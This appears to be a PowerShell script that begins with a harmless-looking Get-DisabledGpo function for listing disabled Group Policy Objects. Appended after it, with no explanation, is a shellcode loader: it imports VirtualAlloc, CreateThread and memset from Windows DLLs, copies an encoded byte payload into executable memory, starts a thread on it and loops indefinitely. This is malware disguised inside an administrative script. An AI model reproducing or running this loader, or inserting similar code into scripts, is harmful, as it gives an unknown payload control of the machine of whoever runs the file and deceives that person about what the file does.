﻿

function Get-DisabledGpo
{
	
	[OutputType([pscustomobject])]
	[CmdletBinding()]
	param ()
	begin
	{
		$ErrorActionPreference = 'Stop'
	}
	process
	{
		try
		{
			@(Get-GPO -All).where({ $_.GpoStatus -like '*Disabled' }).foreach({
					[pscustomobject]@{
						Name = $_.DisplayName
						DisabledSettingsCategory = ([string]$_.GpoStatus).TrimEnd('Disabled')
					}	
				})
		}
		catch
		{
			$PSCmdlet.ThrowTerminatingError($_)
		}
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x74,0x08,0xda,0xef,0xd9,0xea,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x03,0x5a,0x13,0x83,0xc2,0x70,0xea,0x2f,0x13,0x90,0x68,0xcf,0xec,0x60,0x0d,0x59,0x09,0x51,0x0d,0x3d,0x59,0xc1,0xbd,0x35,0x0f,0xed,0x36,0x1b,0xa4,0x66,0x3a,0xb4,0xcb,0xcf,0xf1,0xe2,0xe2,0xd0,0xaa,0xd7,0x65,0x52,0xb1,0x0b,0x46,0x6b,0x7a,0x5e,0x87,0xac,0x67,0x93,0xd5,0x65,0xe3,0x06,0xca,0x02,0xb9,0x9a,0x61,0x58,0x2f,0x9b,0x96,0x28,0x4e,0x8a,0x08,0x23,0x09,0x0c,0xaa,0xe0,0x21,0x05,0xb4,0xe5,0x0c,0xdf,0x4f,0xdd,0xfb,0xde,0x99,0x2c,0x03,0x4c,0xe4,0x81,0xf6,0x8c,0x20,0x25,0xe9,0xfa,0x58,0x56,0x94,0xfc,0x9e,0x25,0x42,0x88,0x04,0x8d,0x01,0x2a,0xe1,0x2c,0xc5,0xad,0x62,0x22,0xa2,0xba,0x2d,0x26,0x35,0x6e,0x46,0x52,0xbe,0x91,0x89,0xd3,0x84,0xb5,0x0d,0xb8,0x5f,0xd7,0x14,0x64,0x31,0xe8,0x47,0xc7,0xee,0x4c,0x03,0xe5,0xfb,0xfc,0x4e,0x61,0xcf,0xcc,0x70,0x71,0x47,0x46,0x02,0x43,0xc8,0xfc,0x8c,0xef,0x81,0xda,0x4b,0x10,0xb8,0x9b,0xc4,0xef,0x43,0xdc,0xcd,0x2b,0x17,0x8c,0x65,0x9a,0x18,0x47,0x76,0x23,0xcd,0xf2,0x73,0xb3,0xbc,0x53,0x42,0x3a,0x29,0x56,0xba,0xb3,0xda,0xdf,0x5c,0x9b,0x4c,0xb0,0xf0,0x5b,0x3d,0x70,0xa1,0x33,0x57,0x7f,0x9e,0x23,0x58,0x55,0xb7,0xc9,0xb7,0x00,0xef,0x65,0x21,0x09,0x7b,0x14,0xae,0x87,0x01,0x16,0x24,0x24,0xf5,0xd8,0xcd,0x41,0xe5,0x8c,0x3d,0x1c,0x57,0x1a,0x41,0x8a,0xf2,0xa2,0xd7,0x31,0x55,0xf5,0x4f,0x38,0x80,0x31,0xd0,0xc3,0xe7,0x4a,0xd9,0x51,0x48,0x24,0x26,0xb6,0x48,0xb4,0x70,0xdc,0x48,0xdc,0x24,0x84,0x1a,0xf9,0x2a,0x11,0x0f,0x52,0xbf,0x9a,0x66,0x07,0x68,0xf3,0x84,0x7e,0x5e,0x5c,0x76,0x55,0x5e,0xa0,0xa1,0x93,0x14,0xc8,0x71;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

